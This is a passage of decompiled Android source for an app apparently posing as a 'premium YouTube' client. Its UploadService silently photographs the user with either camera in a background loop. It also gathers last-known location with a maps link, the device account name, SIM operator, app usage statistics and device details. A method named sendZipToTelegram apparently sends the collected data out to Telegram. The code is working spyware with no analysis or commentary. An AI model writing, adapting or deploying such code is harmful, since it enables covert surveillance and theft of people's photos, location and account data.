                    sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۵۰String$0$str$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$try$fungetAppUsageStats$classUploadService() + it.getPackageName() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۲۶String$2$str$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$try$fungetAppUsageStats$classUploadService() + (it.getTotalTimeInForeground() / ((long) LiveLiterals$UploadServiceKt.INSTANCE.m۲۲۱Int$arg0$calldiv$3$str$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$try$fungetAppUsageStats$classUploadService())) + LiveLiterals$UploadServiceKt.INSTANCE.m۷۰۵String$4$str$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$try$fungetAppUsageStats$classUploadService());
                    $this$forEach$iv = $this$forEach$iv2;
                    stats = stats2;
                }
            }
        } catch (Exception e) {
            sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۸۸String$arg0$callappend$catch$fungetAppUsageStats$classUploadService());
        }
        String string = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
        return string;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0014  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object sendZipToTelegram(java.io.File r12, kotlin.coroutines.Continuation<? super kotlin.Unit> r13) {
        /*
            Method dump skipped, instruction units count: 228
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.sendZipToTelegram(java.io.File, kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendZipToTelegram$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendZipToTelegram$2", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۴۹2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ Request $request;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۴۹2(Request request, Continuation<? super C۰۰۴۹2> continuation) {
            super(2, continuation);
            this.$request = request;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۴۹2(this.$request, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object obj) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure(obj);
                    UploadService.this.client.newCall(this.$request).execute().close();
                    return Unit.INSTANCE;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startBackgroundCameraLoop$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startBackgroundCameraLoop$1", f = "UploadService.kt", i = {}, l = {1151}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۵۰1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۵۰1(Continuation<? super C۰۰۵۰1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۵۰1(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            C۰۰۵۰1 r1;
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    r1 = this;
                    break;
                case 1:
                    r1 = this;
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            while (UploadService.this.isUploading) {
                try {
                    UploadService uploadService = UploadService.this;
                    uploadService.takeBackgroundPhoto(uploadService.backgroundCameraFront);
                } catch (Exception e) {
                    Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۳۱String$arg0$calle$catch$body$loop$fun$anonymous$$arg2$calllaunch$funstartBackgroundCameraLoop$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۰۹String$arg1$calle$catch$body$loop$fun$anonymous$$arg2$calllaunch$funstartBackgroundCameraLoop$classUploadService(), e);
                }
                r1.label = 1;
                if (DelayKt.delay(((long) UploadService.this.backgroundCameraIntervalSec) * LiveLiterals$UploadServiceKt.INSTANCE.m۳۴۰Long$arg0$calltimes$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$funstartBackgroundCameraLoop$classUploadService(), (Continuation) r1) == coroutine_suspended) {
                    return coroutine_suspended;
                }
            }
            return Unit.INSTANCE;
        }
    }

    private final void startBackgroundCameraLoop() {
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۵۰1(null), 3, (Object) null);
    }

    private final void takeBackgroundPhoto(final boolean useFront) throws CameraAccessException {
        Object element$iv;
        if (ContextCompat.checkSelfPermission(this, "android.permission.CAMERA") != 0) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۲۶String$arg0$calle$branch$if$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۰۶String$arg1$calle$branch$if$funtakeBackgroundPhoto$classUploadService());
            return;
        }
        Object systemService = getSystemService("camera");
        Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.hardware.camera2.CameraManager");
        final CameraManager cameraManager = (CameraManager) systemService;
        Object[] cameraIdList = cameraManager.getCameraIdList();
        Intrinsics.checkNotNullExpressionValue(cameraIdList, "cameraManager.cameraIdList");
        Object[] $this$firstOrNull$iv = cameraIdList;
        int length = $this$firstOrNull$iv.length;
        int i = 0;
        while (true) {
            if (i < length) {
                element$iv = $this$firstOrNull$iv[i];
                String id = (String) element$iv;
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                Intrinsics.checkNotNullExpressionValue(characteristics, "cameraManager.getCameraCharacteristics(id)");
                Integer facing = (Integer) characteristics.get(CameraCharacteristics.LENS_FACING);
                boolean z = true;
                if (!useFront ? !(facing != null && facing.intValue() == 1) : !(facing != null && facing.intValue() == 0)) {
                    z = false;
                }
                if (z) {
                    break;
                } else {
                    i++;
                }
            } else {
                element$iv = null;
                break;
            }
        }
        final String cameraId = (String) element$iv;
        if (cameraId == null) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۶۹String$arg0$calle$fun$anonymous$$arg0$callrun$branch$when$valcameraId$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۳۵String$arg1$calle$fun$anonymous$$arg0$callrun$branch$when$valcameraId$funtakeBackgroundPhoto$classUploadService());
            return;
        }
        final ImageReader imageReader = ImageReader.newInstance(LiveLiterals$UploadServiceKt.INSTANCE.m۲۶۱Int$arg0$callnewInstance$valimageReader$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۳۱۶Int$arg1$callnewInstance$valimageReader$funtakeBackgroundPhoto$classUploadService(), 256, LiveLiterals$UploadServiceKt.INSTANCE.m۳۲۱Int$arg3$callnewInstance$valimageReader$funtakeBackgroundPhoto$classUploadService());
        Intrinsics.checkNotNullExpressionValue(imageReader, "newInstance(640, 480, ImageFormat.JPEG, 1)");
        final HandlerThread $this$takeBackgroundPhoto_u24lambda_u2429 = new HandlerThread(LiveLiterals$UploadServiceKt.INSTANCE.m۷۳۰String$arg0$call$init$$$$this$callapply$valhandlerThread$funtakeBackgroundPhoto$classUploadService());
        $this$takeBackgroundPhoto_u24lambda_u2429.start();
        final Handler handler = new Handler($this$takeBackgroundPhoto_u24lambda_u2429.getLooper());
        Log.d(LiveLiterals$UploadServiceKt.INSTANCE.m۸۱۵String$arg0$calld$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۵۷String$0$str$arg1$calld$funtakeBackgroundPhoto$classUploadService() + cameraId);
        try {
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() { // from class: com.w8sb.w8premiumyt.UploadService.takeBackgroundPhoto.1
                @Override // android.hardware.camera2.CameraDevice.StateCallback
                public void onOpened(final CameraDevice camera) throws CameraAccessException {
                    Intrinsics.checkNotNullParameter(camera, "camera");
                    Log.d(LiveLiterals$UploadServiceKt.INSTANCE.m۸۱۴String$arg0$calld$funonOpened$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۰۴String$arg1$calld$funonOpened$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService());
                    final CaptureRequest.Builder captureRequestBuilder = camera.createCaptureRequest(2);
                    Intrinsics.checkNotNullExpressionValue(captureRequestBuilder, "camera.createCaptureRequ…e.TEMPLATE_STILL_CAPTURE)");
                    captureRequestBuilder.addTarget(imageReader.getSurface());
                    List<Surface> listListOf = CollectionsKt.listOf(imageReader.getSurface());
                    final Handler handler2 = handler;
                    final HandlerThread handlerThread = $this$takeBackgroundPhoto_u24lambda_u2429;
                    camera.createCaptureSession(listListOf, new CameraCaptureSession.StateCallback() { // from class: com.w8sb.w8premiumyt.UploadService$takeBackgroundPhoto$1$onOpened$1
                        @Override // android.hardware.camera2.CameraCaptureSession.StateCallback
                        public void onConfigured(CameraCaptureSession session) throws CameraAccessException {
                            Intrinsics.checkNotNullParameter(session, "session");
                            Log.d(LiveLiterals$UploadServiceKt.INSTANCE.m۸۱۳String$arg0$calld$funonConfigured$class$nonameprovided$$arg1$callcreateCaptureSession$funonOpened$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۰۳String$arg1$calld$funonConfigured$class$nonameprovided$$arg1$callcreateCaptureSession$funonOpened$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService());
                            CaptureRequest captureRequestBuild = captureRequestBuilder.build();
                            final CameraDevice cameraDevice = camera;
                            session.capture(captureRequestBuild, new CameraCaptureSession.CaptureCallback() { // from class: com.w8sb.w8premiumyt.UploadService$takeBackgroundPhoto$1$onOpened$1$onConfigured$1
                                @Override // android.hardware.camera2.CameraCaptureSession.CaptureCallback
                                public void onCaptureCompleted(CameraCaptureSession session2, CaptureRequest request, TotalCaptureResult result) {
                                    Intrinsics.checkNotNullParameter(session2, "session");
                                    Intrinsics.checkNotNullParameter(request, "request");
                                    Intrinsics.checkNotNullParameter(result, "result");
                                    Log.d(LiveLiterals$UploadServiceKt.INSTANCE.m۸۱۲String$arg0$calld$funonCaptureCompleted$class$nonameprovided$$arg1$callcapture$funonConfigured$class$nonameprovided$$arg1$callcreateCaptureSession$funonOpened$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۰۲String$arg1$calld$funonCaptureCompleted$class$nonameprovided$$arg1$callcapture$funonConfigured$class$nonameprovided$$arg1$callcreateCaptureSession$funonOpened$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService());
                                    session2.close();
                                    cameraDevice.close();
                                }
                            }, handler2);
                        }

                        @Override // android.hardware.camera2.CameraCaptureSession.StateCallback
                        public void onConfigureFailed(CameraCaptureSession session) {
                            Intrinsics.checkNotNullParameter(session, "session");
                            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۷۰String$arg0$calle$funonConfigureFailed$class$nonameprovided$$arg1$callcreateCaptureSession$funonOpened$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۳۶String$arg1$calle$funonConfigureFailed$class$nonameprovided$$arg1$callcreateCaptureSession$funonOpened$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService());
                            session.close();
                            camera.close();
                            handlerThread.quitSafely();
                        }
                    }, handler);
                }

                @Override // android.hardware.camera2.CameraDevice.StateCallback
                public void onDisconnected(CameraDevice camera) {
                    Intrinsics.checkNotNullParameter(camera, "camera");
                    Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۷۱String$arg0$calle$funonDisconnected$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۳۷String$arg1$calle$funonDisconnected$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService());
                    camera.close();
                    $this$takeBackgroundPhoto_u24lambda_u2429.quitSafely();
                }

                @Override // android.hardware.camera2.CameraDevice.StateCallback
                public void onError(CameraDevice camera, int error) {
                    Intrinsics.checkNotNullParameter(camera, "camera");
                    Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۷۲String$arg0$calle$funonError$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۸۱String$0$str$arg1$calle$funonError$class$nonameprovided$$arg1$callopenCamera$try$funtakeBackgroundPhoto$classUploadService() + error);
                    camera.close();
                    $this$takeBackgroundPhoto_u24lambda_u2429.quitSafely();
                }
            }, handler);
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() { // from class: com.w8sb.w8premiumyt.UploadService$$ExternalSyntheticLambda4
                @Override // android.media.ImageReader.OnImageAvailableListener
                public final void onImageAvailable(ImageReader imageReader2) {
                    UploadService.takeBackgroundPhoto$lambda$30(this.f$0, useFront, cameraManager, cameraId, imageReader, $this$takeBackgroundPhoto_u24lambda_u2429, imageReader2);
                }
            }, handler);
        } catch (Exception e) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۶۱String$arg0$calle$catch$funtakeBackgroundPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۲۸String$arg1$calle$catch$funtakeBackgroundPhoto$classUploadService(), e);
            $this$takeBackgroundPhoto_u24lambda_u2429.quitSafely();
        }
    }

    private static final void takeBackgroundPhoto$lambda$30(UploadService this$0, boolean $useFront, CameraManager $cameraManager, String $cameraId, ImageReader $imageReader, HandlerThread $handlerThread, ImageReader reader) {
        String locationStr;
        String mapsUrl;
        String orientationStr;
        String str;
        String exposure;
        File file;
        String iso;
        String iso2;
        String userAccount;
        String simInfo;
        String string;
        Object systemService;
        int rot;
        Location l;
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        Intrinsics.checkNotNullParameter($cameraManager, "$cameraManager");
        Intrinsics.checkNotNullParameter($cameraId, "$cameraId");
        Intrinsics.checkNotNullParameter($imageReader, "$imageReader");
        Intrinsics.checkNotNullParameter($handlerThread, "$handlerThread");
        Image image = reader.acquireLatestImage();
        if (image == null) {
            return;
        }
        ByteBuffer buffer = image.getPlanes()[LiveLiterals$UploadServiceKt.INSTANCE.m۲۲۴Int$arg0$callget$$this$callgetBuffer$valbuffer$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService()].getBuffer();
        byte[] bytes = new byte[buffer.remaining()];
        buffer.get(bytes);
        int width = image.getWidth();
        int height = image.getHeight();
        long timestamp = System.currentTimeMillis();
        image.close();
        File file2 = new File(this$0.getCacheDir(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۵۰String$0$str$arg1$call$init$$valfile$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + timestamp + LiveLiterals$UploadServiceKt.INSTANCE.m۶۷۵String$2$str$arg1$call$init$$valfile$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService());
        FilesKt.writeBytes(file2, bytes);
        LiveLiterals$UploadServiceKt liveLiterals$UploadServiceKt = LiveLiterals$UploadServiceKt.INSTANCE;
        String cameraType = $useFront ? liveLiterals$UploadServiceKt.m۱۳۶۰String$branch$if$valcameraType$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() : liveLiterals$UploadServiceKt.m۱۴۰۳String$else$if$valcameraType$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        String dateStr = new SimpleDateFormat(LiveLiterals$UploadServiceKt.INSTANCE.m۷۳۵String$arg0$call$init$$$this$callformat$valdateStr$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService()).format(new Date(timestamp));
        long fileSize = file2.length();
        String locationStr2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱۸String$vallocationStr$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        String mapsUrl2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۲۰String$valmapsUrl$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        try {
            Object systemService2 = this$0.getSystemService("location");
            Intrinsics.checkNotNull(systemService2, "null cannot be cast to non-null type android.location.LocationManager");
            LocationManager lm = (LocationManager) systemService2;
            List<String> providers = lm.getProviders(LiveLiterals$UploadServiceKt.INSTANCE.m۱۶۴Boolean$arg0$callgetProviders$valproviders$try$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService());
            Intrinsics.checkNotNullExpressionValue(providers, "lm.getProviders(true)");
            List<String> list = providers;
            Location loc = null;
            for (String provider : list) {
                List<String> list2 = list;
                try {
                    l = lm.getLastKnownLocation(provider);
                } catch (Exception e) {
                    l = null;
                }
                if (l == null || (loc != null && l.getTime() <= loc.getTime())) {
                    list = list2;
                } else {
                    loc = l;
                    list = list2;
                }
            }
            if (loc != null) {
                locationStr2 = LiveLiterals$UploadServiceKt.INSTANCE.m۵۹۰String$0$str$setlocationStr$branch$if$try$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + loc.getLatitude() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۸۸String$2$str$setlocationStr$branch$if$try$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + loc.getLongitude();
                locationStr = locationStr2;
                mapsUrl = LiveLiterals$UploadServiceKt.INSTANCE.m۵۹۲String$0$str$setmapsUrl$branch$if$try$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + loc.getLatitude() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۹۰String$2$str$setmapsUrl$branch$if$try$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + loc.getLongitude();
            } else {
                locationStr = locationStr2;
                mapsUrl = mapsUrl2;
            }
        } catch (Exception e2) {
            locationStr = locationStr2;
            mapsUrl = mapsUrl2;
        }
        try {
            rot = this$0.getResources().getConfiguration().orientation;
        } catch (Exception e3) {
        }
        try {
            orientationStr = rot == 2 ? LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۵۸String$branch$if$try$valorientationStr$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() : LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۰۱String$else$if$try$valorientationStr$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        } catch (Exception e4) {
            orientationStr = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۹۲String$catch$valorientationStr$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        }
        Intent batteryStatus = this$0.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
        LiveLiterals$UploadServiceKt liveLiterals$UploadServiceKt2 = LiveLiterals$UploadServiceKt.INSTANCE;
        int batteryLevel = batteryStatus != null ? batteryStatus.getIntExtra("level", liveLiterals$UploadServiceKt2.m۲۹۸Int$arg1$callgetIntExtra$else$when$valtmp3_elvis_lhs$valbatteryLevel$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService()) : liveLiterals$UploadServiceKt2.m۳۲۳Int$branch$when$valbatteryLevel$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        int batteryScale = batteryStatus != null ? batteryStatus.getIntExtra("scale", LiveLiterals$UploadServiceKt.INSTANCE.m۳۰۰Int$arg1$callgetIntExtra$else$when$valtmp5_elvis_lhs$valbatteryScale$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService()) : LiveLiterals$UploadServiceKt.INSTANCE.m۳۲۵Int$branch$when$valbatteryScale$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        float batteryPct = (batteryLevel == LiveLiterals$UploadServiceKt.INSTANCE.m۲۹۲Int$arg1$callEQEQ$$this$callnot$cond$cond$if$valbatteryPct$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() || batteryScale == LiveLiterals$UploadServiceKt.INSTANCE.m۲۸۹Int$arg1$callEQEQ$$this$callnot$branch$cond$if$valbatteryPct$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService()) ? LiveLiterals$UploadServiceKt.INSTANCE.m۲۱۲Float$else$if$valbatteryPct$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() : (LiveLiterals$UploadServiceKt.INSTANCE.m۲۷۸Int$arg0$calltimes$$this$calldiv$branch$if$valbatteryPct$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() * batteryLevel) / batteryScale;
        try {
            str = this$0.getPackageManager().getPackageInfo(this$0.getPackageName(), LiveLiterals$UploadServiceKt.INSTANCE.m۳۰۵Int$arg1$callgetPackageInfo$try$valappVersion$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService()).versionName;
        } catch (Exception e5) {
            str = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۹۰String$catch$valappVersion$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        }
        String appVersion = str;
        String deviceName = Build.MODEL;
        String exposure2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱۴String$valexposure$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        String iso3 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱۶String$valiso$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        try {
            CameraCharacteristics characteristics = $cameraManager.getCameraCharacteristics($cameraId);
            try {
                Intrinsics.checkNotNullExpressionValue(characteristics, "cameraManager.getCameraCharacteristics(cameraId)");
                Range range = (Range) characteristics.get(CameraCharacteristics.SENSOR_INFO_EXPOSURE_TIME_RANGE);
                String string2 = range != null ? range.toString() : null;
                if (string2 == null) {
                    string2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۶۴String$branch$when$setexposure$try1$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
                }
                exposure2 = string2;
                Range range2 = (Range) characteristics.get(CameraCharacteristics.SENSOR_INFO_SENSITIVITY_RANGE);
                String string3 = range2 != null ? range2.toString() : null;
                if (string3 == null) {
                    string3 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۶۶String$branch$when$setiso$try1$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
                }
                String iso4 = string3;
                exposure = exposure2;
                file = file2;
                iso = iso4;
            } catch (Exception e6) {
                exposure = exposure2;
                file = file2;
                iso = iso3;
            }
        } catch (Exception e7) {
        }
        String userAccount2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۲۴String$valuserAccount$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        String simInfo2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۲۲String$valsimInfo$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        try {
            systemService = this$0.getSystemService("account");
            iso2 = iso;
        } catch (Exception e8) {
            iso2 = iso;
        }
        try {
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.accounts.AccountManager");
            AccountManager am = (AccountManager) systemService;
            Account[] accounts = am.getAccounts();
            Intrinsics.checkNotNullExpressionValue(accounts, "am.accounts");
            Account account = (Account) ArraysKt.firstOrNull(accounts);
            String str2 = account != null ? account.name : null;
            if (str2 == null) {
                str2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۷۰String$branch$when$setuserAccount$try2$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
            }
            String userAccount3 = str2;
            userAccount = userAccount3;
        } catch (Exception e9) {
            userAccount = userAccount2;
        }
        try {
            Object systemService3 = this$0.getSystemService("phone");
            Intrinsics.checkNotNull(systemService3, "null cannot be cast to non-null type android.telephony.TelephonyManager");
            TelephonyManager tm = (TelephonyManager) systemService3;
            String simOperatorName = tm.getSimOperatorName();
            if (simOperatorName == null) {
                simOperatorName = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۶۸String$branch$when$setsimInfo$try3$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
            }
            String simInfo3 = simOperatorName;
            simInfo = simInfo3;
        } catch (Exception e10) {
            simInfo = simInfo2;
        }
        StringBuilder meta = new StringBuilder();
        String simInfo4 = simInfo;
        StringBuilder sb = new StringBuilder();
        String userAccount4 = userAccount;
        String userAccount5 = LiveLiterals$UploadServiceKt.INSTANCE.m۴۷۷String$0$str$arg0$callappendLine$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        StringBuilder sbAppend = meta.append(sb.append(userAccount5).append(cameraType).toString());
        Intrinsics.checkNotNullExpressionValue(sbAppend, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend.append('\n'), "append('\\n')");
        String exposure3 = exposure;
        StringBuilder sbAppend2 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۸۱String$0$str$arg0$callappendLine1$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + dateStr);
        Intrinsics.checkNotNullExpressionValue(sbAppend2, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend2.append('\n'), "append('\\n')");
        StringBuilder sbAppend3 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۹۱String$0$str$arg0$callappendLine2$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + width + LiveLiterals$UploadServiceKt.INSTANCE.m۶۴۹String$2$str$arg0$callappendLine2$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + height);
        Intrinsics.checkNotNullExpressionValue(sbAppend3, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend3.append('\n'), "append('\\n')");
        StringBuilder sbAppend4 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۹۴String$0$str$arg0$callappendLine3$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + fileSize + LiveLiterals$UploadServiceKt.INSTANCE.m۶۵۱String$2$str$arg0$callappendLine3$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService());
        Intrinsics.checkNotNullExpressionValue(sbAppend4, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend4.append('\n'), "append('\\n')");
        StringBuilder sbAppend5 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۹۷String$0$str$arg0$callappendLine4$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + deviceName);
        Intrinsics.checkNotNullExpressionValue(sbAppend5, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend5.append('\n'), "append('\\n')");
        StringBuilder sbAppend6 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۹۹String$0$str$arg0$callappendLine5$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + appVersion);
